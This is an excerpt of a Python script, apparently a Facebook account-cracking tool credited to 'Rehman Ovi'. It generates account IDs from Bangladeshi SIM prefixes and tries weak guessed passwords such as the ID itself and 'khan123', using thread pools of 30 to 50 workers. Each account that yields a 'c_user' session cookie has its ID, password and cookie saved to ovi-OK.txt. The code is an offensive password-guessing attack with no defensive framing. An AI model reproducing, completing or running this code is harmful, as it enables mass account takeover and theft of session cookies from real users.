...
#-*-coding:utf-8-*-
#!/usr/bin/python3
#Open source by Rehman Xyz [XYZCODERZ]
#FACEBOOK- https://www.facebook.com/rehman.ovi.0
#Github https://github.com/Team-Cchl
...
#----------------------[TOOL LOGIN]----------------#
os.system("clear")
os.system('xdg-open https://www.facebook.com/rehman.ovi.0')
...
x=f"{P2}[{H2}•{P2}] Author  : Rehman Ovi\n{P2}[{H2}•{P2}] Facebook: fb.me/rehman.ovi.0\n{P2}[{H2}•{P2}] Github  : github.com/RehmanXYZ"
vprint(panel(x,style=f"{xyzcoderz}"))
...
logo ="""\x1b[1;97m\x1b[1;44m Coded By \x1b[0m\x1b[1;97m\x1b[1;41m Rehman Ovi \x1b[0m """
def loadinglisen():
...
def autopassword():
    user=[]
    x=f"{P2}Put any Bd Sim code\n{P2}Example: 016, 017, 018, 019, 014, 015, 013"
    vprint(panel(x,style=f"{xyzcoderz}"))
    ...
    with ThreadPool(max_workers=30) as RehmanXYZ:
	    clear()
	    x=f"{M2} ______   _____   _     _  _     _ \n{P2}(______) (_____) (_)   (_)(_)   (_)\n{N2}     (_)(_)   (_)(_)___(_)(__)_ (_)\n{H2} _   (_)(_)   (_)(_______)(_)(_)(_)\n{P2}( )__(_)(_)___(_)(_)   (_)(_)  (__)\n{M2} (____)  (_____) (_)   (_)(_)   (_) "
	    vprint(panel(x,style=f"{xyzcoderz}"))
	    x=f"{P2}[{H2}•{P2}] Author  : Rehman Ovi\n{P2}[{H2}•{P2}] Facebook: fb.me/rehman.ovi.0\n{P2}[{H2}•{P2}] Github  : github.com/RehmanXYZ"
	    vprint(panel(x,style=f"{xyzcoderz}"))
	    tl = str(len(user))
	    x=f"{P2}[{H2}•{P2}] Total ids:{H2} {tl}\n{P2}[{H2}•{P2}] Code You choose:{K2} {code}\n{P2}[{H2}•{P2}] Result {M2}CP {P2}Save to : {M2}ovi-CP.txt\n{P2}[{H2}•{P2}] Result {H2}OK {P2}Save to : {H2}ovi-OK.txt\n{P2}[{H2}•{P2}] {H2}ON {M2}OFF{P2} Airplane Mode If No Result"
	    vprint(panel(x,style=f"{xyzcoderz}"))
	    for younis in user:
		    uid = code+younis
		    pwx = [younis,uid,'khankhan','khan1122','khan123']
		    RehmanXYZ.submit(RehmanXYZ_,uid,pwx,tl)
    print('\033[1;37m╭───────────────────────────────────────────────━')
    print('\033[1;97m├───[\033[1;92m•\033[1;97m] \033[1;97mCrack process has been completed')
    print("\033[1;97m├───[\033[1;92m•\033[1;97m] \033[1;91mCP \033[1;97mResult Save to : \033[1;91movi-CP.txt")
    print("\033[1;97m╰───[\033[1;92m•\033[1;97m] \033[1;92mOK \033[1;97mResult save to : \033[1;92movi-OK.txt")
...
def choosepasswprd():
    ...
    for younis in range(passx):
        ...
        RehmanXYZ.append(pww)
    with ThreadPool(max_workers=50) as RehmanXYZ:
        tl = str(len(user))
        clear()
        x=f"{M2} ______   _____   _     _  _     _ \n{P2}(______) (_____) (_)   (_)(_)   (_)\n{N2}     (_)(_)   (_)(_)___(_)(__)_ (_)\n{H2} _   (_)(_)   (_)(_______)(_)(_)(_)\n{P2}( )__(_)(_)___(_)(_)   (_)(_)  (__)\n{M2} (____)  (_____) (_)   (_)(_)   (_) "
        vprint(panel(x,style=f"{xyzcoderz}"))
        x=f"{P2}[{H2}•{P2}] Author  : Rehman Ovi\n{P2}[{H2}•{P2}] Facebook: fb.me/rehman.ovi.0\n{P2}[{H2}•{P2}] Github  : github.com/Team-Cchl"
        vprint(panel(x,style=f"{xyzcoderz}"))
        x=f"{P2}[{H2}•{P2}] Total ids:{H2} {tl}\n{P2}[{H2}•{P2}] Code You choose:{K2} {code}\n{P2}[{H2}•{P2}] Result {M2}CP {P2}Save to : {M2}ovi-CP.txt\n{P2}[{H2}•{P2}] Result {H2}OK {P2}Save to : {H2}ovi-OK.txt\n{P2}[{H2}•{P2}] {H2}ON {M2}OFF{P2} Airplane Mode If No Result"
        vprint(panel(x,style=f"{xyzcoderz}"))
        for younisovi in user:
            #pwx = [love[1:]]
            uid = code+younisovi
            pwx = [younisovi,uid]
            for Alina in RehmanXYZ:
                pwx.append(Alina)
            RehmanXYZ.submit(RehmanXYZ_,uid,pwx,tl)
    print('\033[1;37m╭───────────────────────────────────────────────━')
    print('\033[1;97m├───[\033[1;92m•\033[1;97m] \033[1;97mCrack process has been completed')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				open('/sdcard/ovi-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
				oks.append(cid)
				break
